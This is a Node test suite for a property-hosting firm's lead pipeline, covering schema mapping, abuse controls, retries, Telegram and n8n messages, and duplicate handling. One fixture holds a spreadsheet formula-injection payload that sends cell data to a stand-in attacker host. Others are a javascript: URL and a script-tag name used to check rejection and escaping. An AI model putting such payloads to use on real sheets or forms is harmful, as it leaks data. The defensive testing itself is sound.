import { strict as assert } from "node:assert";
import { beforeEach, describe, it, mock } from "node:test";
import {
  CRM_COLUMNS,
  CRM_HEADER,
  COL,
  EMPTY_ATTRIBUTION,
  SCHEMA_VERSION,
  fromRow,
  isHeaderRow,
  leadInputSchema,
  newLeadId,
  packCampaign,
  phoneKey,
  toRow,
  type CanonicalLead,
  type LeadDelivery,
  type LeadStatus,
  type Service,
} from "../lib/leads/schema.ts";
import { classifyChannel } from "../lib/leads/attribution.ts";
import {
  MIN_FILL_MS,
  RATE_MAX,
  __resetRateLimiter,
  checkRate,
  clientIp,
  detectAutomation,
} from "../lib/server/leads/abuse.ts";
import { isRetryable, withRetry } from "../lib/server/leads/retry.ts";
import { buildTelegramMessage } from "../lib/server/leads/telegram.ts";
import { buildN8nPayload } from "../lib/server/leads/n8n.ts";
import { __setLeadRepository } from "../lib/server/leads/index.ts";
import {
  InMemoryLeadRepository,
  __resetMemoryRepository,
} from "../lib/server/leads/memory-repository.ts";
import { submitLead } from "../lib/server/leads/service.ts";
import type { LeadRepository, RepositoryHealth } from "../lib/server/leads/repository.ts";

/**
 * The lead pipeline, end to end, with no server and no network.
 *
 * Everything below runs against the in-memory repository (or a deliberately
 * broken one), and neither Telegram nor n8n is configured in the test
 * environment, so no real message can escape. That is by design: a test suite
 * that could message the founder is a test suite nobody runs twice.
 */

/* ------------------------------------------------------------------ *
 * Fixtures
 * ------------------------------------------------------------------ */

/**
 * A submission as the browser sends it. renderedAt is backdated past the
 * minimum fill time so the shape itself is not mistaken for a bot.
 */
function submission(over: Record<string, unknown> = {}) {
  return {
    name: "Anita Rao",
    phone: "+91 98765 43210",
    email: "anita@example.com",
    whatsapp: "",
    city: "Goa",
    propertyType: "Villa",
    listingUrl: "",
    message: "Two-bedroom villa in Assagao, occupancy has dropped since March.",
    service: "Free Property Growth Audit" satisfies Service,
    hp: "",
    renderedAt: Date.now() - MIN_FILL_MS - 1_000,
    attribution: EMPTY_ATTRIBUTION,
    ...over,
  };
}

const ctx = { ip: "203.0.113.7", fallbackPath: "/free-audit" };

function lead(over: Partial<CanonicalLead> = {}): CanonicalLead {
  const now = new Date().toISOString();
  return {
    id: newLeadId(),
    createdAt: now,
    updatedAt: now,
    schemaVersion: SCHEMA_VERSION,
    name: "Anita Rao",
    phone: "+919876543210",
    email: "anita@example.com",
    whatsapp: "+919876543210",
    city: "Goa",
    propertyType: "Villa",
    listingUrl: "https://www.airbnb.co.in/rooms/12345",
    notes: "Occupancy has dropped.",
    service: "Free Property Growth Audit",
    status: "New",
    duplicateOf: "",
    channel: "Direct",
    landingPath: "/",
    formPath: "/free-audit",
    referrer: "",
    campaign: "",
    delivery: { crm: "ok", telegram: "ok", n8n: "skipped" },
    ...over,
  };
}

/** A repository whose every write fails, to prove a CRM outage loses nothing. */
class BrokenRepository implements LeadRepository {
  readonly name = "broken";
  readonly persists = true;
  async create(): Promise<void> {
    throw new Error("sheets_http_503");
  }
  async findRecentMatch() {
    return null;
  }
  async list() {
    return [];
  }
  async updateStatus() {
    return false;
  }
  async updateDelivery() {
    return false;
  }
  async health(): Promise<RepositoryHealth> {
    return { configured: true, reachable: false, detail: "unreachable" };
  }
}

beforeEach(() => {
  __resetRateLimiter();
  __resetMemoryRepository();
  __setLeadRepository(new InMemoryLeadRepository());
});

/* ------------------------------------------------------------------ *
 * Canonical schema
 * ------------------------------------------------------------------ */

describe("canonical schema", () => {
  it("maps every column and round-trips a lead through the CRM row", () => {
    const original = lead();
    const row = toRow(original);

    assert.equal(row.length, CRM_COLUMNS.length);
    assert.equal(CRM_HEADER.length, CRM_COLUMNS.length);

    const back = fromRow(row);
    for (const field of [
      "id",
      "name",
      "phone",
      "email",
      "whatsapp",
      "city",
      "propertyType",
      "listingUrl",
      "notes",
      "service",
      "status",
      "channel",
    ] as const) {
      assert.equal(back[field], original[field], `lost ${field} in the round trip`);
    }
  });

  it("writes a timestamp, a status and a schema version on every row", () => {
    const row = toRow(lead());
    assert.ok(Date.parse(String(row[COL.timestamp])) > 0, "timestamp is not a date");
    assert.equal(row[COL.status], "New");
    assert.equal(row[COL.schemaVersion], SCHEMA_VERSION);
  });

  it("records the per-sink delivery outcome in its own cell", () => {
    const delivery: LeadDelivery = { crm: "ok", telegram: "failed", n8n: "skipped" };
    const cell = String(toRow(lead({ delivery }))[COL.delivery]);
    assert.match(cell, /failed/);
  });

  it("keeps a spreadsheet formula as inert text", () => {
    // The Sheets adapter sends valueInputOption RAW; this asserts the schema
    // layer does not "helpfully" transform the value on the way there either.
    // A lead whose name is =IMPORTXML(...) must land as characters, not code.
    const attack = '=IMPORTXML(CONCAT("https://evil.test/?v=",A1),"//a")';
    const row = toRow(lead({ name: attack }));
    assert.equal(row[COL.name], attack);
  });

  it("recognises its own header row so it is never parsed as a lead", () => {
    assert.equal(isHeaderRow(CRM_HEADER), true);
    assert.equal(isHeaderRow(toRow(lead()).map(String)), false);
  });

  it("survives a short or ragged row without throwing", () => {
    // Someone will eventually delete a cell by hand in the Sheet.
    const back = fromRow(["2026-09-04T00:00:00.000Z", "Anita"]);
    assert.equal(back.name, "Anita");
    assert.equal(typeof back.status, "string");
  });

  it("keys phone numbers on the last ten digits", () => {
    assert.equal(phoneKey("+91 98765 43210"), phoneKey("09876543210"));
    assert.notEqual(phoneKey("+919876543210"), phoneKey("+919876543211"));
  });

  it("mints sortable, unambiguous lead ids", () => {
    const id = newLeadId(new Date("2026-09-04T10:00:00Z"));
    assert.match(id, /^SE-20260904-[0-9A-HJ-NP-TV-Z]{6}$/);
    assert.notEqual(newLeadId(), newLeadId());
  });
});

/* ------------------------------------------------------------------ *
 * Attribution
 * ------------------------------------------------------------------ */

describe("attribution", () => {
  it("says Unknown rather than guessing when nothing was captured", () => {
    assert.equal(classifyChannel({ ...EMPTY_ATTRIBUTION, captured: false }), "Unknown");
  });

  it("reads a referrer host", () => {
    const channel = classifyChannel({
      ...EMPTY_ATTRIBUTION,
      captured: true,
      referrer: "https://www.google.com/",
    });
    assert.notEqual(channel, "Unknown");
  });

  it("calls a captured visit with no referrer Direct", () => {
    assert.equal(classifyChannel({ ...EMPTY_ATTRIBUTION, captured: true }), "Direct");
  });

  it("packs campaign tags into one cell and leaves it empty when there are none", () => {
    assert.equal(packCampaign(EMPTY_ATTRIBUTION), "");
    const packed = packCampaign({
      ...EMPTY_ATTRIBUTION,
      captured: true,
      utmSource: "instagram",
      utmCampaign: "goa-hosts",
    });
    assert.match(packed, /instagram/);
    assert.match(packed, /goa-hosts/);
  });
});

/* ------------------------------------------------------------------ *
 * Abuse controls
 * ------------------------------------------------------------------ */

describe("abuse controls", () => {
  const input = () => leadInputSchema.parse(submission());

  it("passes a genuine submission", () => {
    assert.equal(detectAutomation(input()).automated, false);
  });

  it("catches a filled honeypot", () => {
    const v = detectAutomation(leadInputSchema.parse(submission({ hp: "http://spam.test" })));
    assert.deepEqual(v, { automated: true, signal: "honeypot" });
  });

  it("catches an instant fill", () => {
    const v = detectAutomation(leadInputSchema.parse(submission({ renderedAt: Date.now() })));
    assert.equal(v.signal, "too_fast");
  });

  it("does not punish a phone whose clock runs fast", () => {
    const future = leadInputSchema.parse(submission({ renderedAt: Date.now() + 60_000 }));
    assert.equal(detectAutomation(future).automated, false);
  });

  it("allows one link but not a stuffed message", () => {
    const one = submission({ message: "Listing: https://airbnb.co.in/rooms/1 — please look." });
    assert.equal(detectAutomation(leadInputSchema.parse(one)).automated, false);

    const many = submission({ message: "https://a.test https://b.test https://c.test" });
    assert.equal(detectAutomation(leadInputSchema.parse(many)).signal, "link_stuffing");
  });

  it("limits an IP after the allowance and reports a retry delay", () => {
    for (let i = 0; i < RATE_MAX; i++) {
      assert.equal(checkRate("1.1.1.1").limited, false, `limited early at ${i + 1}`);
    }
    const verdict = checkRate("1.1.1.1");
    assert.equal(verdict.limited, true);
    assert.ok(verdict.retryAfterSeconds > 0);
    // A second host behind a different IP is unaffected.
    assert.equal(checkRate("2.2.2.2").limited, false);
  });

  it("reads the left-most forwarded address", () => {
    const req = new Request("https://stayedge.co.in/api/lead", {
      headers: { "x-forwarded-for": "203.0.113.5, 10.0.0.1" },
    });
    assert.equal(clientIp(req), "203.0.113.5");
    assert.equal(clientIp(new Request("https://stayedge.co.in/api/lead")), "unknown");
  });
});

/* ------------------------------------------------------------------ *
 * Retry policy
 * ------------------------------------------------------------------ */

describe("retry policy", () => {
  it("retries only what is worth retrying", () => {
    for (const status of [0, 429, 500, 502, 503]) {
      assert.equal(isRetryable(status), true, `${status} should retry`);
    }
    for (const status of [200, 400, 401, 403, 404, 422]) {
      assert.equal(isRetryable(status), false, `${status} should not retry`);
    }
  });

  it("gives up immediately on a client error", async () => {
    let calls = 0;
    const r = await withRetry(async () => {
      calls++;
      return { ok: false, status: 400, detail: "bad_request" };
    }, []);
    assert.equal(calls, 1);
    assert.equal(r.ok, false);
  });

  it("succeeds on a retry after a transient failure", async () => {
    let calls = 0;
    const r = await withRetry(
      async () => {
        calls++;
        return calls === 1
          ? { ok: false, status: 503, detail: "unavailable" }
          : { ok: true, status: 200, detail: "ok" };
      },
      [1],
    );
    assert.equal(r.ok, true);
    assert.equal(r.attempts, 2);
  });
});

/* ------------------------------------------------------------------ *
 * Telegram + n8n payloads
 * ------------------------------------------------------------------ */

describe("telegram message", () => {
  it("carries what the founder needs to act", () => {
    const l = lead();
    const msg = buildTelegramMessage(l);
    assert.match(msg, /Anita Rao/);
    assert.match(msg, /9876543210/);
    assert.match(msg, new RegExp(l.id));
    assert.match(msg, /wa\.me\/919876543210/);
  });

  it("escapes HTML so a crafted name cannot break the message", () => {
    const msg = buildTelegramMessage(lead({ name: "<b>bold</b> & <script>" }));
    assert.ok(!msg.includes("<b>bold</b>"), "raw markup survived into the message");
    assert.match(msg, /&lt;b&gt;/);
    assert.match(msg, /&amp;/);
  });

  it("marks a repeat enquiry differently from a new one", () => {
    const fresh = buildTelegramMessage(lead({ status: "New" }));
    const repeat = buildTelegramMessage(lead({ status: "Duplicate", duplicateOf: "SE-1" }));
    assert.notEqual(fresh.split("\n")[0], repeat.split("\n")[0]);
  });
});

describe("n8n payload", () => {
  it("is a versioned, idempotent event carrying the whole canonical lead", () => {
    const l = lead();
    const payload = buildN8nPayload(l);
    assert.equal(payload.event, "lead.created");
    assert.equal(payload.version, SCHEMA_VERSION);
    assert.equal(payload.id, l.id);
    assert.equal(payload.lead.phone, l.phone);
    assert.ok(Date.parse(payload.sentAt) > 0);
  });
});

/* ------------------------------------------------------------------ *
 * The lead service
 * ------------------------------------------------------------------ */

describe("lead service", () => {
  it("accepts a valid submission and stores it", async () => {
    const repo = new InMemoryLeadRepository();
    __setLeadRepository(repo);

    const result = await submitLead(submission(), ctx);
    assert.equal(result.outcome, "accepted");
    if (result.outcome !== "accepted") return;

    assert.equal(result.duplicate, false);
    assert.equal(result.lead.status, "New");
    assert.equal(result.lead.delivery.crm, "ok");
    // Unconfigured sinks are "skipped", never silently "ok".
    assert.equal(result.lead.delivery.telegram, "skipped");
    assert.equal(result.lead.delivery.n8n, "skipped");

    const stored = await repo.list();
    assert.equal(stored.length, 1);
    assert.equal(stored[0]!.id, result.lead.id);
  });

  it("defaults WhatsApp to the phone number when it is left blank", async () => {
    const result = await submitLead(submission({ whatsapp: "" }), ctx);
    assert.equal(result.outcome, "accepted");
    if (result.outcome !== "accepted") return;
    assert.equal(phoneKey(result.lead.whatsapp), phoneKey(result.lead.phone));
  });

  it("rejects an invalid submission with per-field messages", async () => {
    const result = await submitLead(submission({ name: "", phone: "12" }), ctx);
    assert.equal(result.outcome, "invalid");
    if (result.outcome !== "invalid") return;
    assert.ok(result.fieldErrors.name, "no message for name");
    assert.ok(result.fieldErrors.phone, "no message for phone");
  });

  it("rejects a malformed listing URL", async () => {
    const result = await submitLead(submission({ listingUrl: "javascript:alert(1)" }), ctx);
    assert.equal(result.outcome, "invalid");
  });

  it("rejects a body that is not a lead at all", async () => {
    assert.equal((await submitLead(null, ctx)).outcome, "invalid");
    assert.equal((await submitLead("hello", ctx)).outcome, "invalid");
  });

  it("discards automated submissions without storing them", async () => {
    const repo = new InMemoryLeadRepository();
    __setLeadRepository(repo);

    const result = await submitLead(submission({ hp: "buy-followers" }), ctx);
    assert.equal(result.outcome, "discarded");
    assert.equal((await repo.list()).length, 0);
  });

  it("marks a repeat enquiry as a duplicate and links it to the original", async () => {
    const first = await submitLead(submission(), ctx);
    assert.equal(first.outcome, "accepted");
    if (first.outcome !== "accepted") return;

    // Same person, same service, formatted differently.
    const second = await submitLead(submission({ phone: "09876543210" }), ctx);
    assert.equal(second.outcome, "accepted");
    if (second.outcome !== "accepted") return;

    assert.equal(second.duplicate, true);
    assert.equal(second.lead.status, "Duplicate" satisfies LeadStatus);
    assert.equal(second.lead.duplicateOf, first.lead.id);
  });

  it("does not treat a different service from the same host as a duplicate", async () => {
    await submitLead(submission(), ctx);
    const other = await submitLead(
      submission({ service: "AI Property Video" satisfies Service }),
      ctx,
    );
    assert.equal(other.outcome, "accepted");
    if (other.outcome !== "accepted") return;
    assert.equal(other.duplicate, false);
  });

  it("rate limits a flood from one IP", async () => {
    for (let i = 0; i < RATE_MAX; i++) {
      const r = await submitLead(submission({ phone: `+9198765432${10 + i}` }), ctx);
      assert.equal(r.outcome, "accepted", `refused genuine submission ${i + 1}`);
    }
    const blocked = await submitLead(submission({ phone: "+919000000000" }), ctx);
    assert.equal(blocked.outcome, "rate_limited");
    if (blocked.outcome !== "rate_limited") return;
    assert.ok(blocked.retryAfterSeconds > 0);
  });

  it("still accepts and reports the lead when the CRM is down", async () => {
    __setLeadRepository(new BrokenRepository());
    // The failure is logged; silence it so the suite output stays readable.
    const err = mock.method(console, "error", () => {});

    const result = await submitLead(submission(), ctx);
    assert.equal(result.outcome, "accepted", "a CRM outage must not reject a real host");
    if (result.outcome !== "accepted") return;

    assert.equal(result.lead.delivery.crm, "failed");
    assert.ok(err.mock.callCount() > 0, "a CRM failure must be logged");
    err.mock.restore();
  });

  it("records the landing path when the client sent no attribution", async () => {
    const result = await submitLead(submission({ attribution: undefined }), ctx);
    assert.equal(result.outcome, "accepted");
    if (result.outcome !== "accepted") return;
    assert.equal(result.lead.formPath, ctx.fallbackPath);
    // Nothing was captured, so the channel must not be invented.
    assert.equal(result.lead.channel, "Unknown");
  });
});

/* ------------------------------------------------------------------ *
 * Repository behaviour
 * ------------------------------------------------------------------ */

describe("in-memory repository", () => {
  it("starts empty — no seed data, ever", async () => {
    assert.deepEqual(await new InMemoryLeadRepository().list(), []);
  });

  it("declares that it does not persist", async () => {
    const repo = new InMemoryLeadRepository();
    assert.equal(repo.persists, false);
    assert.match((await repo.health()).detail, /not persisted/);
  });

  it("updates status and delivery, and reports a miss", async () => {
    const repo = new InMemoryLeadRepository();
    const l = lead();
    await repo.create(l);

    assert.equal(await repo.updateStatus(l.id, "Contacted"), true);
    assert.equal((await repo.list())[0]!.status, "Contacted");

    assert.equal(
      await repo.updateDelivery(l.id, { crm: "ok", telegram: "failed", n8n: "ok" }),
      true,
    );
    assert.equal((await repo.list())[0]!.delivery.telegram, "failed");

    assert.equal(await repo.updateStatus("SE-nope", "Contacted"), false);
  });

  it("filters by status and service", async () => {
    const repo = new InMemoryLeadRepository();
    await repo.create(lead({ status: "New" }));
    await repo.create(lead({ status: "Won" }));
    assert.equal((await repo.list({ status: "Won" })).length, 1);
  });
});
